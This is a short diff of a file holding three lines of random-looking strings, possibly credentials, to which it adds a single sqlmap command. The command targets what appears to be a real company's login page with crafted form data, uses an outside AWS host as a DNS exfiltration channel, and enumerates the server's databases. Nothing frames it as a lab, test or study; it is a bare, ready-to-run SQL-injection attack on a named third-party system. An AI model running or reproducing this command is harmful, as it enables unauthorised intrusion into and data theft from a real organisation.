@@ -1,3 +1,5 @@
 rfzW2*&VBHJKncn12357
 (Jjhdfj&^^Tgj*&56312
 KJH1jndvo())311232d1
+
+sqlmap --dbms=MSSQL -dns-domain ec2-54-156-223-76.compute-1.amazonaws.com -u https://origin-service.elliemae.com/Login.aspx --data="VIEWSTATE=%2FwEPDwUKMTg5MDQzNTQ2N2Rk0s1DLhmKz90MM8H%2BgAlsHVSkxRhFg8eUXkzyvyT6hyU%3D&VIEWSTATEGENERATOR=C2EE9ABB&mainNav=Login.aspx&subNav=&txtLogin=tst*&txtPwd=Welcome&txtEmail=&ForPassword=false" -technique=S --batch --dbs
